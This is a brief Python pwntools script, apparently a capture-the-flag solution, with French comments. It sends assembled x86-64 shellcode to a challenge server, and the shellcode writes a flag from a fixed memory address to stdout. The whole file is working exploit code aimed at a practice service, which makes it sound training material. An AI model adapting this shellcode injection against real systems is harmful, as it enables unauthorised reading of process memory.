#!/usr/bin/env python3
# 3 - asm reader : le flag est lu en memoire a 0x123412340000 (0x28 octets).
# Seuls stdin(0) et stderr(2) sont fermes -> stdout(1) reste ouvert.
# On fait write(1, 0x123412340000, 0x28) puis exit(0). bufsize=48, on fournit tout.
from pwn import *
context.arch = "amd64"
context.log_level = "warning"

HOST, PORT = "chal.sigpwny.com", 9002
code = asm("""
    mov eax, 1                 /* write */
    mov edi, 1                 /* fd = stdout */
    mov rsi, 0x123412340000    /* buffer = flag */
    mov edx, 0x28              /* count = 40 */
    syscall
    mov eax, 60                /* exit */
    xor edi, edi
    syscall
""")

io = remote(HOST, PORT)
io.recvuntil(b"Give me code:")
io.send(code)
print(io.recvall(timeout=5).decode(errors="replace"))
